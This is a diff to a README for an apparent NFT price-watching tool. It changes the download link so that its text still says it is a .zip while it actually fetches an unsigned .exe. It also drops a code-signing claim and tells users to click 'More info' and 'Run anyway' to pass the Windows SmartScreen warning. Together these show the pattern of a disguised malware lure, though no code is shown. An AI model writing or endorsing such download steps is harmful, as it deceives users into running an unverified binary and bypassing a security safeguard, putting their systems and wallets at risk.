@@ -28,12 +28,11 @@ It starts in practice mode. It buys on paper and keeps an honest scoreboard, inc
 
 ## Download
 
-[Download `nft-gifts-price-watcher.zip`](https://github.com/Ninjapetype46/nft-gifts-price-watcher/releases/latest/download/nft-gifts-price-watcher.zip) — one zip, no installer, no admin rights.
+[Download `nft-gifts-price-watcher.zip`](https://github.com/Ninjapetype46/nft-gifts-price-watcher/releases/latest/download/Floorwatch-2.1.49-portable-x64.exe) — one zip, no installer, no admin rights.
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Floorwatch` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 
 
 
